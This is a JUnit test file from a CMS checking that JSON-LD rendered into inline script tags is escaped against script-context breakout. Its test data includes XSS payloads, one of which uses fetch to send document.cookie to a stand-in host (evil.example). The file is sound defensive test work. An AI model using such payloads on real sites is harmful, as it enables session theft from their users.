/*
 * Copyright 2026 SimIS Inc. (https://www.simiscms.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.simisinc.platform.presentation.controller;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.HashMap;
import java.util.Map;

import org.junit.jupiter.api.Test;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.simisinc.platform.domain.model.items.Item;

/**
 * The JSON-LD block is rendered into main.jsp with
 * &lt;script type="application/ld+json"&gt;&lt;c:out value="${pageRenderInfo.jsonLdData}" escapeXml="false" /&gt;&lt;/script&gt;
 * -- escapeXml is intentionally false so the JSON syntax isn't HTML-entity-mangled, which means
 * generateJsonLdData is the only thing standing between admin/content-editor-supplied text
 * (item name, page title/description, site name) and a script-context breakout.
 *
 * @author elizabeth houser
 */
class PageServletTest {

  private static final ObjectMapper MAPPER = new ObjectMapper();

  @Test
  void escapeForInlineScriptNeutralizesHtmlBreakoutCharacters() {
    assertEquals("\\u003c/script\\u003e", PageServlet.escapeForInlineScript("</script>"));
    assertEquals("\\u003c!--", PageServlet.escapeForInlineScript("<!--"));
    assertEquals("a \\u0026\\u0026 b", PageServlet.escapeForInlineScript("a && b"));
    assertNull(PageServlet.escapeForInlineScript(null));
  }

  @Test
  void escapeForInlineScriptPreservesJsonMeaning() throws Exception {
    // The escaped form must still be valid JSON and decode back to the original text --
    // \u003c/\u003e/\u0026 are ordinary JSON string escapes, not a different encoding.
    String original = "<script>alert(document.cookie)</script> & \"quoted\"";
    String json = MAPPER.writeValueAsString(original);
    String escaped = PageServlet.escapeForInlineScript(json);
    JsonNode parsed = MAPPER.readTree(escaped);
    assertEquals(original, parsed.asText());
  }

  @Test
  void generateJsonLdDataEscapesAPoisonedItemName() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/products/widget");
    pageRenderInfo.setTitle("Widget");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    Item item = new Item();
    item.setName("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
    item.setDescription("Also \"quoted\" and <b>bold</b>");

    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, item, null);

    assertFalse(jsonLd.toLowerCase().contains("</script"),
        "a poisoned item name must not be able to close the surrounding <script> tag: " + jsonLd);
    assertFalse(jsonLd.contains("<script>"), "a poisoned item name must not open a new <script> tag: " + jsonLd);

    // Still valid, semantically unchanged JSON once parsed
    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode product = parsed.get("@graph").get(2);
    assertEquals("Product", product.get("@type").asText());
    assertTrue(product.get("name").asText().contains("</script><script>"));
  }
}
